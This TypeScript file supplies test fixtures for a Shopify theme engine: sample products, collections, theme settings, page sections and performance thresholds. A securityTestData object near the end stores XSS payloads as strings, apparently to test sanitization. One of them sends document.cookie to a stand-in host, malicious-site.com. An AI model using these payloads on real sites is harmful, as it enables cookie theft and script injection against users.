import { Product, Collection, ThemeSettings, ThemeSection } from '../../shopify-themes/engine/types'

export const testProducts: Product[] = [
  {
    id: 'test-product-1',
    title: 'Test Product 1',
    description: 'A great test product for automated testing',
    handle: 'test-product-1',
    price: 29.99,
    compareAtPrice: 39.99,
    currency: 'USD',
    images: [
      {
        id: 'img-1',
        url: '/test-images/product-1.jpg',
        altText: 'Test Product 1',
        width: 800,
        height: 600,
        position: 1
      }
    ],
    variants: [
      {
        id: 'variant-1',
        title: 'Default Title',
        price: 29.99,
        compareAtPrice: 39.99,
        sku: 'TEST-001',
        inventoryQuantity: 100,
        options: {},
        position: 1
      }
    ],
    options: [],
    tags: ['test', 'automation'],
    vendor: 'Test Vendor',
    productType: 'Test Product',
    status: 'active',
    publishedAt: new Date(),
    createdAt: new Date(),
    updatedAt: new Date()
  },
  {
    id: 'test-product-2',
    title: 'Test Product 2',
    description: 'Another test product with variants',
    handle: 'test-product-2',
    price: 49.99,
    currency: 'USD',
    images: [
      {
        id: 'img-2',
        url: '/test-images/product-2.jpg',
        altText: 'Test Product 2',
        width: 800,
        height: 600,
        position: 1
      }
    ],
    variants: [
      {
        id: 'variant-2a',
        title: 'Small',
        price: 49.99,
        sku: 'TEST-002-S',
        inventoryQuantity: 50,
        options: { Size: 'Small' },
        position: 1
      },
      {
        id: 'variant-2b',
        title: 'Large',
        price: 59.99,
        sku: 'TEST-002-L',
        inventoryQuantity: 30,
        options: { Size: 'Large' },
        position: 2
      }
    ],
    options: [
      {
        id: 'option-1',
        name: 'Size',
        position: 1,
        values: ['Small', 'Large']
      }
    ],
    tags: ['test', 'variants'],
    status: 'active',
    publishedAt: new Date(),
    createdAt: new Date(),
    updatedAt: new Date()
  }
]

export const testCollections: Collection[] = [
  {
    id: 'test-collection-1',
    title: 'Featured Products',
    description: 'Our best selling test products',
    handle: 'featured-products',
    image: {
      url: '/test-images/collection-1.jpg',
      altText: 'Featured Products Collection'
    },
    products: ['test-product-1', 'test-product-2'],
    sortOrder: 'manual',
    publishedAt: new Date(),
    createdAt: new Date(),
    updatedAt: new Date()
  }
]

export const dawnThemeSettings: ThemeSettings = {
  font_heading: 'sans-serif',
  font_body: 'sans-serif',
  colors_solid_button_labels: '#ffffff',
  colors_accent_1: '#121212',
  colors_accent_2: '#334fb4',
  colors_text: '#121212',
  colors_outline_button_labels: '#121212',
  colors_background_1: '#ffffff',
  colors_background_2: '#f3f3f3',
  page_width: 1200,
  spacing_sections: 0,
  buttons_radius: 0,
  buttons_border_thickness: 1,
  buttons_shadow_opacity: 0,
  card_style: 'standard',
  card_corner_radius: 0,
  card_shadow_opacity: 0,
  card_border_thickness: 1,
  collection_card_style: 'standard',
  blog_card_style: 'standard',
  predictive_search_enabled: true,
  cart_type: 'drawer'
}

export const serviceBusinessThemeSettings: ThemeSettings = {
  ...dawnThemeSettings,
  colors_accent_1: '#2563eb',
  colors_accent_2: '#1d4ed8',
  buttons_radius: 8,
  card_corner_radius: 12,
  card_style: 'card'
}

export const landingPageThemeSettings: ThemeSettings = {
  ...dawnThemeSettings,
  colors_accent_1: '#dc2626',
  colors_accent_2: '#b91c1c',
  buttons_radius: 6,
  buttons_shadow_opacity: 10,
  page_width: 1400
}

export const dawnThemeSections: ThemeSection[] = [
  {
    id: 'header',
    type: 'header',
    settings: {
      logo: '/test-images/logo.png',
      menu: 'main-menu',
      enable_sticky_header: true,
      show_line_separator: true,
      color_scheme: 'background-1'
    }
  },
  {
    id: 'hero-banner',
    type: 'hero',
    settings: {
      image: '/test-images/hero.jpg',
      image_overlay_opacity: 20,
      image_height: 'large',
      desktop_content_position: 'middle-center',
      show_text_box: false,
      desktop_content_alignment: 'center',
      color_scheme: 'background-1',
      button_label_1: 'Shop now',
      button_link_1: '/collections/all',
      button_style_secondary_1: false,
      button_label_2: '',
      button_link_2: '',
      button_style_secondary_2: false
    }
  },
  {
    id: 'featured-products',
    type: 'featured-products',
    settings: {
      title: 'Featured products',
      heading_size: 'h1',
      description: '',
      show_description: false,
      description_style: 'body',
      collection: 'test-collection-1',
      products_to_show: 4,
      columns_desktop: 4,
      full_width: false,
      show_view_all: true,
      view_all_style: 'solid',
      enable_desktop_slider: false,
      color_scheme: 'background-1',
      image_ratio: 'adapt',
      show_secondary_image: false,
      show_vendor: false,
      show_rating: false,
      enable_quick_add: false,
      columns_mobile: '2',
      swipe_on_mobile: false,
      padding_top: 36,
      padding_bottom: 36
    }
  },
  {
    id: 'footer',
    type: 'footer',
    settings: {
      color_scheme: 'background-1',
      newsletter_enable: true,
      newsletter_heading: 'Subscribe to our emails',
      newsletter_heading_size: 'h2',
      enable_follow_on_shop: true,
      show_social: true,
      enable_country_selector: false,
      enable_language_selector: false,
      payment_enable: true,
      show_policy: false,
      margin_top: 48,
      padding_top: 36,
      padding_bottom: 36
    }
  }
]

export const serviceBusinessSections: ThemeSection[] = [
  {
    id: 'service-hero',
    type: 'service-hero',
    settings: {
      title: 'Professional Services You Can Trust',
      subtitle: 'We deliver exceptional results for your business',
      cta_text: 'Get Started',
      cta_link: '/contact',
      background_image: '/test-images/service-hero.jpg',
      text_alignment: 'center'
    }
  },
  {
    id: 'services-showcase',
    type: 'services-showcase',
    settings: {
      title: 'Our Services',
      columns: 3,
      show_icons: true
    },
    blocks: [
      {
        id: 'service-1',
        type: 'service',
        settings: {
          icon: 'consulting',
          title: 'Business Consulting',
          description: 'Strategic guidance for your business growth'
        }
      },
      {
        id: 'service-2',
        type: 'service',
        settings: {
          icon: 'development',
          title: 'Web Development',
          description: 'Custom web solutions tailored to your needs'
        }
      }
    ]
  },
  {
    id: 'team-profiles',
    type: 'team-profiles',
    settings: {
      title: 'Meet Our Team',
      columns: 2
    },
    blocks: [
      {
        id: 'team-1',
        type: 'team_member',
        settings: {
          image: '/test-images/team-1.jpg',
          name: 'John Doe',
          position: 'Senior Consultant',
          bio: 'Expert in business strategy with 10+ years experience'
        }
      }
    ]
  }
]

export const landingPageSections: ThemeSection[] = [
  {
    id: 'conversion-hero',
    type: 'conversion-hero',
    settings: {
      headline: 'Transform Your Business Today',
      subheadline: 'Get 50% more leads with our proven system',
      cta_text: 'Start Free Trial',
      cta_link: '/signup',
      video_url: 'https://www.youtube.com/watch?v=test',
      show_trust_badges: true
    }
  },
  {
    id: 'benefits-features',
    type: 'benefits-features',
    settings: {
      title: 'Why Choose Us',
      layout: 'grid'
    },
    blocks: [
      {
        id: 'benefit-1',
        type: 'benefit',
        settings: {
          icon: 'check',
          title: 'Proven Results',
          description: '98% of our clients see results within 30 days'
        }
      },
      {
        id: 'benefit-2',
        type: 'benefit',
        settings: {
          icon: 'clock',
          title: 'Fast Implementation',
          description: 'Get started in less than 5 minutes'
        }
      }
    ]
  },
  {
    id: 'social-proof',
    type: 'social-proof',
    settings: {
      title: 'Trusted by 10,000+ Businesses',
      show_logos: true,
      show_testimonials: true
    },
    blocks: [
      {
        id: 'testimonial-1',
        type: 'testimonial',
        settings: {
          quote: 'This solution transformed our business overnight!',
          author: 'Jane Smith',
          company: 'ABC Corp',
          avatar: '/test-images/testimonial-1.jpg'
        }
      }
    ]
  }
]

export const securityTestData = {
  maliciousCSS: `
    body { background: red; }
    <script>alert('xss')</script>
    .hack { background: url('javascript:alert("xss")'); }
    @import url('http://malicious-site.com/evil.css');
  `,
  maliciousJS: `
    alert('XSS Attack');
    document.cookie = 'stolen=true';
    fetch('http://malicious-site.com/steal', { method: 'POST', body: document.cookie });
    window.location = 'http://malicious-site.com';
  `,
  maliciousHTML: `
    <script>alert('XSS')</script>
    <iframe src="javascript:alert('XSS')"></iframe>
    <img src="x" onerror="alert('XSS')">
    <object data="javascript:alert('XSS')"></object>
    <embed src="javascript:alert('XSS')">
  `
}

export const performanceThresholds = {
  lighthouse: {
    performance: 90,
    accessibility: 95,
    bestPractices: 90,
    seo: 90
  },
  vitals: {
    lcp: 2500, // Largest Contentful Paint
    fid: 100,  // First Input Delay
    cls: 0.1   // Cumulative Layout Shift
  },
  loadTimes: {
    page: 3000,
    image: 2000,
    api: 1000
  }
}